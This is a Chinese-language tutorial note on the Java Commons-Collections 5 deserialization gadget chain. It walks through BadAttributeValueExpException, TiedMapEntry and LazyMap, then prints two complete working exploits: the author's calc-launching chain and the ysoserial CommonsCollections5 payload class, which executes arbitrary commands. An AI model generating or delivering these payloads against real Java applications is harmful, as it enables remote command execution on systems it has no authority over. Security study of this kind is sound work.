###### tags: `Java 反序列化`
[TOC]
# Java 反序列化之 CC5
## 前言
最后两个链子了，之前的学习还没细瞅 yso 的代码，以后还是多看看，毕竟是很有名的大佬写的。
## 环境搭建
- JDK8U65
- CommomCollections 3.2.1 


> 注意不是 CommonCollections4 ，因为 4 的 LazyMap 没有 decorate() 方法，不能完成 CC5 的链子。
## 漏洞流程图

以下是 yso 的调用链

![](https://i.imgur.com/jIJh1S3.png)

根据以上链子可以画出流程图：
(比较细，在 InvokerTrnasformer.transform() 那里可以停了)
![](https://i.imgur.com/Wicl3gk.png)

也可以看看芜风师傅的流程图：

![](https://i.imgur.com/UWZzpBH.png)

## 漏洞分析
直接套用师傅原话：
>让我找这里肯定很难找出来，去看了 yso 的官方链子，入口类是 BadAttributeValueExpException 的 readObject() 方法，这一个倒是不难。关键是后面的。

> 逆向思维来看的话，LazyMap.get() 方法被 TiedMapEntry.toString() 所调用，而如果去找谁调用了 toString() 这也太多了，太难找了，我们只能正向分析。直接看官方的链子，再去写 EXP 吧。

接下来就通过正向分析一步步看看 CC5 是如何命令执行的。

**1. BadAttributeValueExpException.readObject()**


![](https://i.imgur.com/9aSGn3N.png)

从上图可以看到在 86 行调用了 valObj.toString()；这个 valObj 是我们可控的。

在链子中我们调用的是 TiedMapEntry.toString()，也就是要让 valObj 为一个 TiedMapEntry 类对象。
> valObj 其实就是反序列化的 BadAttributeValueExpException 类对象的 val 成员属性值

具体操作可以根据这个类的构造函数来：

![](https://i.imgur.com/KNOE7Au.png)

发现是公有，所以之后写 exp 直接实例化就可以。值得注意的一个点是实例化的时候传入的 val 需要为 null，因为根据上图我们可以看到该类的构造函数当 val 不为空时会自动调用 toString() 方法，而我们的传入的 val 正是 TiedMapEntry，这样就会提前触发链子，所以我们初始时需要传入一个 null 到构造函数里，之后再通过反射修改回来。

**2. TiedMapEntry.toString()**

在 TiedMapEntry.toSring() 方法中调用了 getValue() 方法用于获取当前 entry 的 value，而在这个方法中调用了 map.get() 方法。map 是 TiedMapEntry 的一个常量成员属性，是我们可控的，在链子中需要让 map 为 LazyMap 类对象

![](https://i.imgur.com/9yioRhs.png)

![](https://i.imgur.com/ekwWAW1.png)

![](https://i.imgur.com/CrkW0T7.png)


3. LazyMap.get()

紧接着上图我们现在就调用到了 LazyMap.get() 方法，后续的命令执行就和 CC1 一样了，故不细说，直接给出相关代码：

![](https://i.imgur.com/7wUzDCx.png)

`Factory` 是该类一个常量成员属性，在链子中让其为 ChainedTransformer。
![](https://i.imgur.com/tHLCY7P.png)

## CC5 EXP 
### 自写的 EXP
- 这里 LazyMap 的后面半条链子是可以用的，我们直接把 CC1 那一部分的拿进来。
```java=
package security.java.cc5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

//        Class<LazyMap> lazyMapClass = LazyMap.class;
//        Method lazyGetMethod = lazyMapClass.getDeclaredMethod("get", Object.class);
//        lazyGetMethod.setAccessible(true);
//        lazyGetMethod.invoke(decorateMap, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,"123");// 后一个参数是 ChainedTransformer.transform(key) 的参数，因为会被转化，所以可以随便写。

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class bad = badAttributeValueExpException.getClass();
        Field field = bad.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMapEntry);

        serialize(badAttributeValueExpException);
        unserialize("ser.bin");



    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static void unserialize(String name) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(name));
        objectInputStream.readObject();
    }
}

```
### YSO 的 EXP
```java=
package ysoserial.payloads;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
		        new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				new InvokerTransformer("exec",
					new Class[] { String.class }, execArgs),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
		valfield.set(val, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections5.class, args);
	}

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
```

## 参考链接
[ysoCC5](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java)
[芜风师傅](https://drun1baby.github.io/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/#toc-heading-7)